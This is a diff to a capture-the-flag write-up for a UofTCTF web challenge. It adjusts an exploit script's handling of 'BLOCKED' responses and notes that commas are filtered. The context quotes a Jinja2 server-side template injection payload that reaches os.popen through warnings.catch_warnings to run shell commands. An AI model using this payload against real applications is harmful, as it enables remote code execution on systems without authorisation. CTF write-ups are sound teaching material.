@@ -112,6 +112,8 @@ response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cooki
 
 if '500' in response.text:
     print('Internal Server Error')
+elif 'BLOCKED' in response.text:
+    print(response.text)
 else:
     result = response.text.split('\n')[15][38:-6]
     print(html.unescape(result))
@@ -220,7 +222,7 @@ Unfortunately, it seems like we cannot use the File class to read the flag as th
 
 In [Hacktricks jinja2 SSTI RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) there are two ideas:
 
-1. use `<class 'subprocess.Popen'>` to run shell (I did not get this to work as I could not call functions with multiple arguments)
+1. use `<class 'subprocess.Popen'>` to run shell (I did not get this to work as I could not call functions with multiple arguments since commas are blocked)
 2. use `<class 'warnings.catch_warnings'>` to create an instance of the class then `._module.__builtins__['__import__']('os').popen("ls").read()`
 
 
@@ -361,6 +363,8 @@ response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cooki
 
 if '500' in response.text:
     print('Internal Server Error')
+elif 'BLOCKED' in response.text:
+    print(response.text)
 else:
     result = response.text.split('\n')[15][38:-6]
     print(html.unescape(result))
@@ -433,6 +437,8 @@ response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cooki
 
 if '500' in response.text:
     print('Internal Server Error')
+elif 'BLOCKED' in response.text:
+    print(response.text)
 else:
     result = response.text.split('\n')[15][38:-6]
     print(html.unescape(result))
